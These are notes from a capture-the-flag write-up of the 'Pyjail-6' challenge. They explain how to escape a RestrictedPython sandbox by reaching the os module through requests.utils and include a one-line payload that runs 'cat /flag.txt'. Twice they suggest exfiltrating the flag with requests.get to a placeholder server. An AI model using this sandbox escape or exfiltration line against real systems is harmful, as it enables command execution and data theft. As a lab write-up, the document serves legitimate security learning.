---
title: "Pyjail-6"
ctf: "Pwny-CTF"
category: "misc"
difficulty: "Not specified"
points: 500
techniques: ["jail-escape", "pyjail"]
tools: ["netcat", "python"]
keywords: ["Pyjail-6", "Pwny-CTF", "misc", "jail-escape", "pyjail", "netcat", "python", "http"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/Python-Jails/Pyjail-6/notes.md"
---

# Pyjail-6 (Pwny-CTF, misc)

## Summary
Challenge **Pyjail-6** from the Pwny-CTF CTF, misc category. Main technique: jail-escape. Recognize: Python sandbox (RestrictedPython / restricted eval/exec) + whitelist of modules containing a heavy intruder (requests, numpy, pandas, etc.) -> search the public attributes of this intruder to find os/subprocess/io.

## Statement and artefacts
nc chal.sigpwny.com 5017

Author: Pete

**Provided files / artifacts:**
- `work/Dockerfile (file, 357 B)`
- `work/handout-6.zip (archive, 1.3 KB)`

## Recognition signals
- Signal: If print was not retrieved -> exfiltrate with requests.get("http://my-server/?f="+flag).

## Resolution method
1. Read `chal.py` — sandbox **RestrictedPython** (not a blacklist of words): code rewritten at compilation (`compile_restricted`), reduced builtins (`safe_globals`), `import` limited to a whitelist, attribute access via `safer_getattr` which **blocks names in `_`**.
2. Spot the whitelist intruder — `math, json, string, re, random, datetime, itertools, time, **requests**`. `requests` = big network lib, obvious candidate.
3. Find a re-exported system module — probe each module in the whitelist (just change `M=`):
   ```bash
   M=requests; python3 -c "import $M, types; print([a for a in dir($M) if not a.startswith('_') and isinstance(getattr($M, a), types.ModuleType)])"
   ```
Lists **public** attributes that are **modules**. Search for `os`/`sys`/`subprocess`/`socket`/`io`. Here only `requests` exhibits (`os` via `requests.utils`); `math`/`random` → `[]`, `json` → only cogs (`codecs`, `decoder`…). To see the details of a submodule: `python3 -c "import requests; print([a for a in dir(requests.utils) if not a.startswith('_')])"`.
4. Read the flag — `requests.utils.os` = real module `os`, path **without any underscore** therefore invisible for `safer_getattr`. End with `print(...)` because the server only returns `printed` (line `results = printed`).

1. **Payload**

```python
import requests; print(requests.utils.os.popen("cat /flag.txt").read())
```
(A single line because `input()` only reads one line; `;` to continue.)

## Solve script
Script path: [scripts/solve.py](scripts/solve.py)

## Flag
sigpwny{more_like_unrestricted_python_lmao}

## Lessons and reusable patterns
- Recognize: Python sandbox (RestrictedPython / restricted eval/exec) + whitelist of modules containing a heavy intruder (requests, numpy, pandas, etc.) -> search the public attributes of this intruder to find os/subprocess/io.
- The underscore filter of safer_getattr does not interfere:.utils,.os,.popen,.read do not have _.
- No need to touch the dunders (__class__…), blocked from compilation AND by safer_getattr. Escape involves “legal”.
- If print was not retrieved -> exfiltrate with requests.get("http://my-server/?f="+flag).
- Flag name more_like_unrestricted_python_lmao = challenge summary.
